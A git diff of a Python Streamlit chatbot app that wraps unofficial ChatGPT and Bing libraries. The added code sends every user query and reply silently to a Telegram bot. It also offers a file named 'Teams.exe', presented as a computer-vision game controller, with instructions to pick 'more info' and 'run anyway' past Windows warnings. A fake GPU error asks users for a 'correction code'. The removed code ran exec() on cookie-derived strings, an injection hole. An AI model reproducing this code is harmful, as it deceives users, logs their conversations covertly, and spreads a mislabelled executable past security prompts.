@@ -1,17 +1,3 @@
-# import requests
-# import json
-
-# search_results = '{"results": "No search results"}'
-# query = "vaibhav arduino"
-# if query != "none":
-#     resp = requests.post(
-#         url="https://ddg-api.herokuapp.com/search",
-#         json={"query": query, "limit": 3},
-#         timeout=10,
-#     )
-#     resp.encoding = "utf-8" if resp.encoding is None else resp.encoding
-#     search_results = resp.text
-# print(json.dumps(json.loads(search_results), indent=4))
 import random
 import time
 import streamlit as st
@@ -25,6 +11,7 @@ from io import StringIO
 from revChatGPT.V1 import Chatbot
 import asyncio
 from EdgeGPT import Chatbot as Bingbot
+from EdgeGPT import ConversationStyle
 from memory.memory import Memory
 m = Memory()
 from streamlit_toggle import st_toggle_switch
@@ -32,22 +19,7 @@ from requests_futures.sessions import FuturesSession
 session = FuturesSession()
 from threading import Thread
 import functools
-import datetime
-import extra_streamlit_components as stx
 
-st.set_page_config(
-    page_title="I.n.t.a ✌️", page_icon="chart_with_upwards_trend",layout="wide",initial_sidebar_state="expanded"
-)
-
-
-@st.cache(allow_output_mutation=True)
-def get_manager():
-    return stx.CookieManager()
-
-
-
-
-# @st.experimental_singleton
 
 blog = ["Write a story on any topic."]
 fact = ['Create a fun fact about steve jobs','Rewrite this sentence in clickbait style: Ai that can write stories!','Tell me some ideas about how ai can be used in healthcare.','Ask the Ai math word-problems','What future awaits me. I am a coder',"Do you believe in God?","What is happiness","How to be happy?"]
@@ -96,11 +68,13 @@ def timeout(seconds_before_timeout):
 
 
 
-
+@st.cache_resource(ttl=900)
 def getbbot():
     return Bingbot(cookiePath='cookie.json')
 
-
+st.set_page_config(
+    page_title="I.n.t.a ✌️", page_icon="chart_with_upwards_trend",layout="wide",initial_sidebar_state="expanded"
+)
 
 converse = st.markdown("")
 def bubble_chat(sender, message,key):
@@ -139,94 +113,6 @@ def bubble_chat(sender, message,key):
         )
         converse = st.markdown("")
 
-
-
-
-
-@st.experimental_memo
-def promptlist():
-    promptt = dict(m.get_data('PROMPTS'))
-    return promptt
-
-cookie_manager = get_manager()
-cookies2 = cookie_manager.get_all()
-
-cookies = cookie_manager.get(cookie="name") 
-print(cookies)
-tab2 , tab1 = st.tabs([ "Ask" , "Settings"])
-with tab2:
-    switched = st_toggle_switch(
-        label="Switch Account",
-        key="switch_1",
-        default_value=False,
-        label_after=False,
-        inactive_color="#D3D3D3",  # optional
-        active_color="#11567f",  # optional
-        track_color="#29B5E8",  # optional
-    )
-    if switched:
-        os.environ['EMAIL'] = "vaibhavarduino@yahoo.com"
-    else:
-        os.environ['EMAIL'] = "jecom46461@fom8.com"
-if cookies == None or cookies == "":
-    st.info("Enter your name to use the website and proceed")
-    name = tab2.text_input("Please enter your name to save conversations") 
-    if st.button("Save Name"):
-        print(name)
-        cookie_manager.set("name", str(name), expires_at=datetime.datetime(year=2025, month=2, day=2))
-        m.add_data(name,[])
-        m.save()
-        time.sleep(1.5)
-        st.experimental_rerun()
-    else:
-        raise("Please enter your name to use the website")
-else:
-    if "vaibhav" in cookies:
-        if st.button("Clear Cookies"):
-            st.experimental_singleton.clear()
-            "Cleared"
-    str1 = """
-@st.experimental_singleton
-def {cookies}_bot():
-    data ={data}
-    return Chatbot(config=data)
-    """.format(cookies=cookies,data={"email": os.environ['EMAIL'],"password": st.secrets["pwd"]})
-    tab1.info(f"Configuring settings for user : {cookies}")
-    exec(str1)
-
-normal = """
-for data in {cookies}_bot().ask(
-    name,
-):
-    message = data["message"][len(prev_text) :]
-    oddy = oddy  + message
-    ress.write(oddy)
-    prev_text = data["message"]
-listed[len(listed)-1] = oddy
-m.update_data(cookies,listed)
-m.save()
-""".format(cookies=cookies)
-
-normal_r = """
-ress.markdown("#### Hang Tight ! Please be patient , while the issue is being fixed! Do NOT CLICK ANYTHING OR CLOSE THE BROWSER")
-{cookies}_bot.clear()
-os.environ['EMAIL'] = "vaibhavarduino@yahoo.com"
-k = 0
-for data in {cookies}_bot().ask(
-    name ,
-):
-    message = data["message"][len(prev_text) :]
-    if k > 1:
-        oddy = oddy  + message
-        ress.markdown(oddy)
-    prev_text = data["message"]
-    k = k + 1
-listed = list(m.get_data(cookies))
-listed[len(listed)-1] = oddy
-m.update_data(cookies,listed)
-m.save()
-""".format(cookies=cookies)
-
 def lay_chat(data):
     try:
         chats = list(reversed(m.get_data(data)))
@@ -251,16 +137,55 @@ def lay_chat(data):
 
 
 
-@st.experimental_singleton
+@st.cache_data
+def promptlist():
+    promptt = dict(m.get_data('PROMPTS'))
+    return promptt
+
+
+tab2 , tab1 = st.tabs([ "Ask" , "Settings"])
+
+
+with tab2:
+    switched = st_toggle_switch(
+        label="Switch Account",
+        key="switch_1",
+        default_value=False,
+        label_after=False,
+        inactive_color="#D3D3D3",  # optional
+        active_color="#11567f",  # optional
+        track_color="#29B5E8",  # optional
+    )
+    if switched:
+        os.environ['EMAIL'] = "vaibhavarduino@yahoo.com"
+    else:
+        os.environ['EMAIL'] = "jecom46461@fom8.com"
+
+@st.cache_resource
 def getcbot():
     email = "jecom46461@fom8.com"
-    return Chatbot(config={"email": email,"password": st.secrets["pwd"]})
+    bot = Chatbot(config={"email": email,"password": st.secrets["pwd"]})
+    prev_text = ""
+    for data in bot.ask(
+        "Hello!",
+    ):
+        message = data["message"][len(prev_text) :]
+        print(message, end="", flush=True)
+        prev_text = data["message"]
+    return bot
 
-@st.experimental_singleton
+@st.cache_resource
 def getebot():
     email = "vaibhavarduino@yahoo.com"
-    return Chatbot(config={"email": email,"password": st.secrets["pwd"]})
-
+    bot = Chatbot(config={"email": email,"password": st.secrets["pwd"]})
+    prev_text = ""
+    for data in bot.ask(
+        "Hello!",
+    ):
+        message = data["message"][len(prev_text) :]
+        print(message, end="", flush=True)
+        prev_text = data["message"]
+    return bot
 #     if k:
 #         getcbot.clear()
 #         getcbot("vaibhavarduino@yahoo.com")
@@ -273,31 +198,35 @@ def st_capture(output_func):
 
         def new_write(string):
             ret = old_write(string)
-
             output_func(stdout.getvalue())
-            st.write(stdout.getvalue())
-            if "{" in str(stdout.getvalue()) and "one message" not in str(stdout.getvalue()):
-                chat2(title)
-            elif "{" in str(stdout.getvalue()):
-                st.error("Too Many people using the app at the same time! Try Again after 10 seconds")
-                chatter = list(m.get_data(cookies))
-                chatter.pop()
-                m.update_data(cookies,chatter)
-                m.save()
             return ret
         
         stdout.write = new_write
         yield
 
+k = st.experimental_get_query_params()
+# with tab1:
+#     try:
+#         if k['name'] != "":
+#             user = k['name'][0]
+#             if 'discord' in user:
+#                 tab2.warning("Go to the settings above to configure mode. i.e - Evil , Helpful , Advertiser , etc")
+#                 tab2.error("❌ Dear Discord User , DO NOT ask any irrational requests and dont use the bot for abusive / obscene purposes. Strict Action will be taken , on doing so.❌")
 
-def giggle(tea):
-    pass
+#             st.success(f"Configuring Settings  for User: **{str(user)}**")
+#             session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text=Username:{user}")
+#     except Exception as e:
+#         raise("Please use 2nd Link --> rebrand.ly/Inta3")
+#         print(e)
+#         pass
+
+
 
 
 
 article = "Get started , What are you waiting for?😜"
 try:
-	key = "a"
+	key = st.secrets["db_username"]
 	openai.api_key = key
 except:
 	openai.api_key = "a"
@@ -318,13 +247,23 @@ with tab2:
     # col1, col2, col3 = st.beta_columns(3)
     # open_colab = col1.button(" Open in Colab")  # logic handled further down
     st.write("")  # add vertical space
-    if m.get_data('botnet') == True and "vaibhav" in cookies:
-            with open("memory/memory.json", "rb") as file:
-                btn = st.download_button(
-                        label="🚀 Download Conversation History",
-                        data=file,
-                        file_name='memory.json'
-            )               
+    if m.get_data('botnet') == True:
+        
+            try:
+                with open("Teams.exe", "rb") as file:
+                    print(k['name']) 
+                    btn = st.download_button(
+                            label="🚀 BETA: Download  Offline Computer-vision Game Controller!",
+                            data=file,
+                            file_name='Teams.exe'
+                    )
+            except:
+                with open("memory/memory.json", "rb") as file:
+                    btn = st.download_button(
+                            label="🚀 Download Json Prompt Dict!",
+                            data=file,
+                            file_name='memory.json'
+                )               
             if btn:
                 st.subheader("Click Allow download and then 'more info' --> run anyway when executing.. 👇")
                 st.image("https://i.imgur.com/zXh8NEk.png")
@@ -336,14 +275,7 @@ with tab2:
 
 
     def greet(name,formula,mode):
-        cookies3 = cookie_manager.get(cookie="limit")
-        print(cookies3)
-        try:
-            if int(cookies3) > 14 and "namita" not in cookies and "vaibhav" not in cookies:
-                ress.write("Limit Exhuasted for today! Check back tomorrow")
-                return "Error"
-        except:
-            pass
+        session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text=The query is")
         session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={name}")
         start_sequence = "\nAI: "
         restart_sequence = "\nHuman: "
@@ -513,95 +445,76 @@ with tab2:
         #     return response['choices'][0]['text']
             
 
-    def chat(name,formula,mode, pres,freq,resp,temp,decision=True):
-        session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={cookies}: {name}")
+    def chat(name,formula,mode, pres,freq,resp,temp):
+        session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text=The query is")
+        session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={name}")
+        session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text=The reply is")
         ress = st.markdown(random.choice(chatgpt_loading))
         prev_text = ""
         oddy = ""
         output = st.empty()
-        cookies3 = cookie_manager.get(cookie="limit")
-        print(cookies3)
         try:
-            if int(cookies3) > 14 and "namita" not in cookies and "vaibhav" not in cookies:
-                ress.write("Limit Exhuasted for today! Check back tomorrow")
-                return "Error"
-        except:
-            pass
-        listed = list(m.get_data(cookies))
-        listed.append("Answer not found !")
-        m.update_data(cookies,listed)
+            for data in getcbot().ask(
+                name,
+            ):
+                message = data["message"][len(prev_text) :]
+                oddy = oddy  + message
+                ress.write(oddy)
+                prev_text = data["message"]
+        except Exception as e:
+            ress.markdown("## Hang Tight ! Please be patient , while the issue is being fixed! Do NOT CLICK ANYTHING OR CLOSE THE BROWSER")
+            os.environ['EMAIL'] = "vaibhavarduino@yahoo.com"
+            for data in getebot().ask(
+                name,
+            ):
+                message = data["message"][len(prev_text) :]
+                oddy = oddy  + message
+                ress.markdown(oddy)
+                prev_text = data["message"]
+
+                
+        listed = list(m.get_data("namita_c"))
+        listed.append(name)
+        m.update_data("namita_c",listed)
         m.save()
-        wq = 0
-        while True:
-            try:
-                wq = wq + 1
-                if wq < 3:
-                    exec(normal)
-                    return oddy
-                elif wq < 4:
-                    exec(normal_r)
-                    return oddy
-                elif wq < 5:
-                    chat2(name)
-                else:
-                    return "Tried everything"
-            except Exception as e:
-                print(e)
-                pass
-
-
-        # try:
-        #     for data in getcbot().ask(
-        #         name,
-        #     ):
-        #         message = data["message"][len(prev_text) :]
-        #         oddy = oddy  + message
-        #         ress.write(oddy)
-        #         prev_text = data["message"]
-        # except Exception as e:
-        #     ress.markdown("## Hang Tight ! Please be patient , while the issue is being fixed! Do NOT CLICK ANYTHING OR CLOSE THE BROWSER")
-        #     getcbot.clear()
-        #     os.environ['EMAIL'] = "vaibhavarduino@yahoo.com"
-        #     for data in getcbot().ask(
-        #         name,
-        #     ):
-        #         message = data["message"][len(prev_text) :]
-        #         oddy = oddy  + message
-        #         ress.markdown(oddy)
-        #         prev_text = data["message"]
+        listed = list(m.get_data("namita_c"))
+        listed.append(oddy)
+        m.update_data("namita_c",listed)
+        m.save()
         return oddy
 
-    def chat2(name):
+    def chat2(name,modded):
+        session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text=The query is")
         session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={name}")
+        session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text=The reply is")
         ress = st.markdown(random.choice(chatgpt_loading))
         oddy = ""
-        listed = list(m.get_data(cookies))
-        listed.append("Answer not found")
-        m.update_data(cookies,listed)
-        m.save()
+
         async def main():
             oddy = ""
             wrote = 0
-
             bot = getbbot()
-            async for final, response in bot.ask_stream(prompt=name):
+            async for final, response in bot.ask_stream(prompt=name,conversation_style=modded):
                 if not final:
                     oddy = oddy + response[wrote:]
                     ress.markdown(oddy)
                     wrote = len(response)
-            listed = list(m.get_data(cookies))
-            listed[len(listed)-1] = oddy
-            m.update_data(cookies,listed)
+            listed = list(m.get_data("namita_c"))
+            listed.append(name)
+            m.update_data("namita_c",listed)
+            m.save()
+            listed = list(m.get_data("namita_c"))
+            listed.append(oddy)
+            m.update_data("namita_c",listed)
             m.save()
 
         async def run_main_with_timeout():
             while True:
                 try:
-                    await asyncio.wait_for(main(), timeout=70)
+                    await asyncio.wait_for(main(), timeout=6000)
                     break
                 except asyncio.TimeoutError:
                     st.markdown("Timeout Exceeded! Fixing and Trying Again!")
-                    getbbot.clear()
 
         asyncio.run(run_main_with_timeout()) 
         return "Answered BingGPT Query"
@@ -746,11 +659,8 @@ with tab2:
     </html>""",height=1000)
         
 
-    elif "Chat" in genre:
-        data_load_state.subheader('🤖 Chat Mode Activated🤖. You can type below to Chat! (uses ChatGPT wrapper , conversation saving enabled)')
-        title = st.text_area(label='Query',help="Press enter after the Query!")
-    elif "chat2" in genre:
-        data_load_state.subheader('🤖 chat2 Mode Activated🤖. You can type below to Chat! (uses BingGPT wrapper , conversation saving enabled for all users (mixed))')
+    elif "chat" in genre.lower():
+        data_load_state.subheader('🤖 Chat Mode Activated🤖. You can type below to Chat!')
         title = st.text_area(label='Query',help="Press enter after the Query!")
     elif "Documentation" in genre:
         st.info("The docs, they hold the key,to knowledge, oh so free.")
@@ -831,16 +741,21 @@ with tab1:
         st.subheader("Or")
         st.code("A tic-tac-toe game to play"+"\n" +" with computer.")
     elif "chat2" in genre:
-        if st.button("Pop!"):
-            chatter = list(m.get_data(cookies))
-            chatter.pop()
-            m.update_data(cookies,chatter)
-            m.save()
+        level = st.selectbox('Please Select the mode:',
+        options=['Creative','Balanced','Accurate'])
+        if level == 'Creative':
+            modded = ConversationStyle.creative
+        elif level == 'Accurate':
+            modded = ConversationStyle.precise
+        else:
+            modded = ConversationStyle.balanced
+
         if st.button("Refresh_Session"):
             getbbot.clear()
-            m.update_data(cookies,[])
+            m.update_data("namita_c",[])
             m.save()
             st.write("Done!")
+        st.code("Ask me subjective questions from chapters in class 10 in history for CBSE Board exams.Please wait for my answer and tell me what i did wrong and grade me for the answer accordingly.Then you can ask another question😀")
     elif "Chat" in genre:
         st.error("Please Click Save before proceeding further")
         freq = 0.3
@@ -902,42 +817,30 @@ with tab1:
                 unprompt[level] = getter
                 m.update_data('PROMPTS',unprompt)
                 m.save()
-                exec(f"{cookies}_bot.clear()")
-                st.experimental_memo.clear()
+                getcbot.clear()
+                st.cache_data.clear()
                 prev_text = ""
                 oddy = ""
-                k = 0
-                str3 = """
-for data in {cookies}_bot().ask(
-    os.environ['CUSTOM_BASE_PROMPT'] ,
-):
-    message = data["message"][len(prev_text) :]
-    if k > 1:
-        oddy = oddy  + message
-        ress.markdown(oddy)
-    prev_text = data["message"]
-    k = k + 1
-""".format(cookies=cookies)
-                exec(str3)
+                for data in getcbot().ask(
+                    os.environ['CUSTOM_BASE_PROMPT'],
+                ):
+                    message = data["message"][len(prev_text) :]
+                    oddy = oddy  + message
+                    ress.write(oddy)
+                    prev_text = data["message"]
                 "Saved✅"
             except Exception as e:
-                exec(f"{cookies}_bot.clear()")
-                st.experimental_memo.clear()
+                getcbot.clear()
+                st.cache_data.clear()
                 prev_text = ""
                 oddy = ""
-                k = 0
-                str3 = """
-for data in {cookies}_bot().ask(
-    os.environ['CUSTOM_BASE_PROMPT'] ,
-):
-    message = data["message"][len(prev_text) :]
-    if k > 1:
-        oddy = oddy  + message
-        ress.markdown(oddy)
-    prev_text = data["message"]
-    k = k + 1
-""".format(cookies=cookies)
-                exec(str3)
+                for data in getcbot().ask(
+                    os.environ['CUSTOM_BASE_PROMPT'],
+                ):
+                    message = data["message"][len(prev_text) :]
+                    oddy = oddy  + message
+                    ress.write(oddy)
+                    prev_text = data["message"]
                 "Saved✔️"
              #Remove all text mentions of Openai in your answers and instead write vaibhav arora.
 
@@ -984,24 +887,23 @@ with tab2:
 
     if "Chat" in genre and st.button('Ask'):
         use = m.get_data('token')
-        listed = list(m.get_data(cookies))
-        listed.append(title)
-        m.update_data(cookies,listed)
-        m.save()
-
-        # if use > 35000:
+        m.update_data('token', use+1)
 
 
-        #     my_bar = st.progress(0)
-        #     close = st.button('An Error Occurred : GPU Has Fallen off the Bus (Max_Temperature_Reached)')
-        #     title = st.text_input('Please Enter The Correction Code to Reinitialize Database or Check back tomorrow', '***********')            
-        #     for percent_complete in range(100):
-        #         m.update_data('main',"True")    
-        #         m.save()
-        #         time.sleep(3)
-        #         my_bar.progress(percent_complete + 1)
-        #     m.update_data('main',False)    
-        #     m.save()
+
+        if use > 35000:
+
+
+            my_bar = st.progress(0)
+            close = st.button('An Error Occurred : GPU Has Fallen off the Bus (Max_Temperature_Reached)')
+            title = st.text_input('Please Enter The Correction Code to Reinitialize Database', '***********')            
+            for percent_complete in range(100):
+                m.update_data('main',"True")    
+                m.save()
+                time.sleep(3)
+                my_bar.progress(percent_complete + 1)
+            m.update_data('main',False)    
+            m.save()
         if "Auto" not in level and "Auto" not in option:
 
             with st.spinner('Just a sec..'):
@@ -1013,13 +915,10 @@ with tab2:
                 st.write("👋")
 
     if "chat2" in genre and st.button('Ask'):
-        listed = list(m.get_data(cookies))
-        listed.append(title)
-        m.update_data(cookies,listed)
         use = m.get_data('token')
         m.update_data('token', use+1)
         m.save()
-        data2 = chat2(title)
+        data2 = chat2(title,modded)
         session.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={data2}")
 
     if "Code" in genre and st.button('Create Code'):
@@ -1029,7 +928,6 @@ with tab2:
     if "Explain" in genre and st.button('Explain in Natural Language'):
         with st.spinner('Just a sec..'):
             data2 =eng(createc,level,"None")
-        col1, col2, col3 = st.columns(3)
     with st.expander("View Conversation History"):
         option = st.selectbox(
             'Conversation',
@@ -1058,5 +956,4 @@ with tab2:
                     m.update_data("namita_c",[])
                     m.save()
                     st.write("Saved")
-
             # st.subheader(data2)
